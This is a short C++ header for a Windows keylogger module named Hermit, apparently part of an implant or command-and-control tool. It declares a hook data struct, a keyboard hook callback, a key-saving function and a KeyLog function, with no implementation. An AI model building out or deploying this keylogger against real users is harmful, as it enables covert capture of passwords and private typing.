#ifndef HERMIT_KEYLOG_HPP
#define HERMIT_KEYLOG_HPP

#include <windows.h>
#include <string>
#include <strsafe.h>
#include <map>
#include <chrono>
#include "common.hpp"
#include "convert.hpp"
#include "macros.hpp"

typedef struct _MYHOOKDATA
{
    int nType;
    HOOKPROC hkprc;
    HHOOK hhook;
} MYHOOKDATA;

VOID SaveKey(DWORD dwKey);
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lPram);
std::wstring KeyLog(INT nLogTime);

#endif // HERMIT_KEYLOG_HPP